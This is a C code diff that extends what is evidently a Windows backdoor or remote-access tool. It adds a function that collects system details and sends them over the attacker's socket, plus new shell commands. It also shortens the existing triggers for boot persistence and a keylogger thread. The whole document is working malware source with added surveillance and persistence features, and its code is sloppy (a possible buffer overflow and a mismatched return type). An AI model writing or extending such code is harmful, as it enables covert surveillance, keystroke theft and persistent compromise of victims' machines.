@@ -90,6 +90,38 @@ str_cut(char str[], int slice_from, int slice_to)
         return buffer;
 }
 
+char* gsi() {
+
+    char a[254] = ("");
+
+    SYSTEM_INFO sys_info;
+    GetSystemInfo(&sys_info);
+
+    OSVERSIONINFO os_info;
+    os_info.dwOSVersionInfoSize = sizeof(os_info);
+    GetVersionEx(&os_info);
+
+    MEMORYSTATUSEX mem_info;
+    mem_info.dwLength = sizeof(mem_info);
+    GlobalMemoryStatusEx(&mem_info);
+
+    sprintf(a, "{\"os_name\":\"%s\",\"os_version\":%d.%d,\"cpu_architecture\":%d,\"page_size\":%u,\"processor_count\":%u,\"total_physical_memory\":%llu,\"free_physical_memory\":%llu,\"total_virtual_memory\":%llu,\"free_virtual_memory\":%llu}",
+    os_info.szCSDVersion,
+    os_info.dwMajorVersion,
+    os_info.dwMinorVersion,
+    sys_info.wProcessorArchitecture,
+    sys_info.dwPageSize,
+    sys_info.dwNumberOfProcessors,
+    mem_info.ullTotalPhys,
+    mem_info.ullAvailPhys,
+    mem_info.ullTotalVirtual,
+    mem_info.ullAvailVirtual
+    );
+
+    send(sock,a,sizeof(a),0);
+    return 0;
+   
+}
 
 void Shell() {
     char buffer[1024];
@@ -108,13 +140,25 @@ void Shell() {
             WSACleanup();
             exit(0);
         }
+        else if(strncmp("help", buffer, 5) == 0){
+            printf("caca");
+        }
+        else if(strncmp("pwd", buffer, 3) == 0){
+            //pwd
+        }
+        else if(strncmp("ls", buffer, 3) == 0){
+            //ls
+        }
+        else if(strncmp("sys", buffer, 3) == 0){
+            gsi();
+        }
         else if (strncmp("cd ", buffer, 3) == 0) {
             chdir(str_cut(buffer,3,100)); // probably no dirnames bigger than 100 chars :)
         }
-        else if (strncmp("persist", buffer, 7) == 0 ) {
+        else if (strncmp("per", buffer, 3) == 0 ) {
                 bootRun();
         }
-        else if (strncmp("keylog_start", buffer, 12) == 0 ) {
+        else if (strncmp("kl", buffer, 2) == 0 ) {
             HANDLE thread = CreateThread(NULL, 0, logg, NULL, 0, NULL);
             goto jump;
         }
